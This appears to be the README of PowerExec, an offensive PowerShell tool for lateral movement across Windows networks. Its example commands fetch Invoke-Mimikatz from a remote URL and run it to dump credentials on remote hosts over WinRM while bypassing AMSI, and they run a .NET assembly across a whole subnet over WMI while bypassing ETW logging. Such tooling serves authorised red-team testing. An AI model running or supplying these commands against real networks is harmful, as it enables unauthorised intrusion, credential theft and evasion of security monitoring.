# PowerExec

PowerExec is a PowerShell tool to move laterally on a Windows network.

## Functions

```
Invoke-PowerExec                -   execute PowerShell script block on remote computers through various techniques
Get-PowerLoader                 -   build script block which safely loads PowerShell or .NET assembly
```

## Examples

Run a PowerShell script through WinRM using a download cradle while bypassing Antimalware Scan Interface (AMSI):

```
PS C:\> Get-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Protocol WinRM
```

Run a .NET assembly through WMI while bypassing Event Tracing for Windows (ETW):

```
PS C:\> Get-PowerLoader -Type NetAsm -FilePath .\sample.exe -Bypass ETW | Invoke-PowerExec -ComputerList 192.168.1.0/24 -Protocol WMI -Threads 10
```
